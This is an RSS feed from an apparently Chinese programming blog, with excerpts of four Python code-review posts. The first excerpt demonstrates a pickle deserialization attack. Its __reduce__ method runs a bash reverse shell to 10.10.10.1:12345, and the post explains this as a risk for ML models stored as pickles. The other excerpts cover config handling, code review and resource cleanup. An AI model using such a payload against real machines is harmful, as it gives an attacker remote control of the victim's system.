@@ -1,0 +1,121 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>python on 蘭陵N梓記</title>
+    <link>http://lanlingzi.cn/tags/python/</link>
+    <description>Recent content in python on 蘭陵N梓記</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-CN</language>
+    <lastBuildDate>Sat, 13 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="http://lanlingzi.cn/tags/python/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>飞哥讲代码24：从Python Pickle漏洞说起</title>
+      <link>http://lanlingzi.cn/post/technical/2021/0313_code/</link>
+      <pubDate>Sat, 13 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://lanlingzi.cn/post/technical/2021/0313_code/</guid>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;《泾溪》&amp;ndash; 杜荀鹤&lt;br&gt;
+泾溪石险人兢慎，终岁不闻倾覆人。&lt;br&gt;
+却是平流无石处，时时闻说有沉论。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
+&lt;p&gt;有次同事找我看个Python的安全问题。测试代码是这样的：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;pickle&lt;/span&gt;
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;os&lt;/span&gt;
+
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Test&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;object&lt;/span&gt;):
+    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;__reduce__&lt;/span&gt;(self):
+        cmd = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;&amp;#34;&amp;#34;bash -i &amp;amp;&amp;gt; /dev/tcp/10.10.10.1/12345 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; (os.system,(cmd,))
+
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; __name__ == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+    test = Test()
+    bs = pickle.dumps(test)
+    pickle.loads(bs)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。&lt;/p&gt;
+&lt;p&gt;目前Python在AI领域应用越来越多，不少传统机器学习的模型也采用pickle格式保存。如基于sklearn训练的模型，通常采用pickle.dump把模型生成pkl文件，当再使用模型时，则通过pickle.load加载模型来进行推理预测。像Java中json/xml/yaml的序列化与反序列化一样，python的pickle对象序列化与反序列化存在更为严重的安全风险。&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>飞哥讲代码14：好代码源自相互改进</title>
+      <link>http://lanlingzi.cn/post/technical/2020/0920_code/</link>
+      <pubDate>Sun, 20 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://lanlingzi.cn/post/technical/2020/0920_code/</guid>
+      <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
+&lt;p&gt;下面的代码是来自我们新构建的服务，采用Python语言开发。案例故事是这样：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;开始：&lt;/strong&gt; 某同学最先开发某功能，需要读取服务的配置文件，代码如下，是代码直接读取文件取配置项：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;HOME_PATH = os.environ[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;HOME&amp;#39;&lt;/span&gt;]
+DASK_PROPERTIES_PATH = HOME_PATH + &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;/training/webapps/lodas/WEB-INF/classes/application-dask.properties&amp;#39;&lt;/span&gt;
+DASK_PROPERTIES_DICT = Properties(DASK_PROPERTIES_PATH).get_properties()
+
+CLUSTER_WORKER_THREAD_NUM = DASK_PROPERTIES_DICT[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;lodap.dask.cluster.worker.nthreads&amp;#39;&lt;/span&gt;]
+.... &lt;span style=&#34;color:#228b22&#34;&gt;# 省略其它配置项的获取代码&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;后续：&lt;/strong&gt; 功能不断增加，又分配给 &lt;em&gt;不同的同学来实现&lt;/em&gt; ，也需要读取同目录下其它的配置文件，于是又出现 &lt;em&gt;类似&lt;/em&gt; 上面的代码写法，但略有差别，就不再贴代码了。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;问题：&lt;/strong&gt; 经过一段时间，发现类似读取配置项的代码段 &lt;em&gt;散落&lt;/em&gt; 到我们源码中多个地方。从功能上讲，代码也没什么问题；但从可维护角度来看，若后面对配置增加约束或者配置文件挪位置，侧需要修改多处。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;重构：&lt;/strong&gt; 对它的改进也很简单，对一个服务的多个配置文件集中管理，提供 &lt;em&gt;封装&lt;/em&gt; 对象。改进之后代码如下，并且做了一点小的容错性增强：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;[1] 检查配置文件存在时才加入dict中，解决当文件不存在时，直接调用Properties(file)抛异常问题。&lt;/li&gt;
+&lt;li&gt;[2] 当配置项不存在时，支持默认值，解决代码中直接对Dict取下标操作时当不存在Key抛异常问题。&lt;/li&gt;
+&lt;/ul&gt;</description>
+    </item>
+    
+    <item>
+      <title>飞哥讲代码13：好代码须匠心打磨</title>
+      <link>http://lanlingzi.cn/post/technical/2020/0912_code/</link>
+      <pubDate>Sat, 12 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://lanlingzi.cn/post/technical/2020/0912_code/</guid>
+      <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
+&lt;p&gt;目前写Python的同学越来越多了，但动态语言无类型约束，导致Commit时难以review。先来看一段我们的代码：&lt;/p&gt;
+&lt;p&gt;优化前的代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;handle&lt;/span&gt;(self, data, rules):
+        rule_type = rules[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#228b22&#34;&gt;# 1&lt;/span&gt;
+        rule_list = rules[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;rules&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#228b22&#34;&gt;# 2&lt;/span&gt;
+        res = None
+
+        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#658b00&#34;&gt;str&lt;/span&gt;(rule_type).lower() != RULES_MAPPING:
+            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ValueError&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;type of rule should be &amp;#39;rules_mapping&amp;#39;&amp;#34;&lt;/span&gt;)
+
+        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt; rule &lt;span style=&#34;color:#8b008b&#34;&gt;in&lt;/span&gt; rule_list:
+            col_name = rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;column&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#228b22&#34;&gt;# 2&lt;/span&gt;
+            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;function&amp;#39;&lt;/span&gt;].lower() == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;cast&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#228b22&#34;&gt;# 3&lt;/span&gt;
+                mapping_dict, other = self.parse_cast(rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mapping&amp;#39;&lt;/span&gt;])
+                res = data[col_name].apply(self.case_func, args=(mapping_dict, other))
+            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;elif&lt;/span&gt; rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;function&amp;#39;&lt;/span&gt;].lower() == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;in&amp;#39;&lt;/span&gt;:
+                mapping_dict, other = self.parse_in(rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mapping&amp;#39;&lt;/span&gt;])
+                res = data[col_name].apply(self.in_func, args=(mapping_dict, other))
+            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;elif&lt;/span&gt; rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;function&amp;#39;&lt;/span&gt;].lower() == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;binning&amp;#39;&lt;/span&gt;:
+                res = data[col_name].apply(self.binning_func, args=(rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mapping&amp;#39;&lt;/span&gt;]))
+            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt;:
+                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ValueError&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;not supported function&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#228b22&#34;&gt;# 4 &lt;/span&gt;
+        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; res
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;代化之后的代码：&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>飞哥讲代码1：确保资源被释放</title>
+      <link>http://lanlingzi.cn/post/technical/2020/0516_code/</link>
+      <pubDate>Sat, 16 May 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://lanlingzi.cn/post/technical/2020/0516_code/</guid>
+      <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
+&lt;p&gt;下面的代码来自我们某一工具源码(Python语言)中：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;file_gz = gzip.GzipFile(file_name)
+src_path, src_file = os.path.split(file_name)
+tmp_file_name = os.path.join(path_name, src_file).strip(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;gz&amp;#39;&lt;/span&gt;).strip(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
+tmp_file = &lt;span style=&#34;color:#658b00&#34;&gt;open&lt;/span&gt;(tmp_file_name, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;)
+tmp_file.writeline(file_gz.realines())
+file_gz.close()
+tmp_file.close()
+os.remove(file_name)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从代码健壮角度来看，存在如下两个问题：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;缺少捕获异常，在GzipFile打开文件，open打开文件之后的操作都可能抛出异常&lt;/li&gt;
+&lt;li&gt;当抛出异常时，file_gz与tmp_file就会出现未正常close，存在文件句柄的泄露问题&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;能正确释放资源的建议写法是:&lt;/p&gt;</description>
+    </item>
+    
+  </channel>
+</rss>
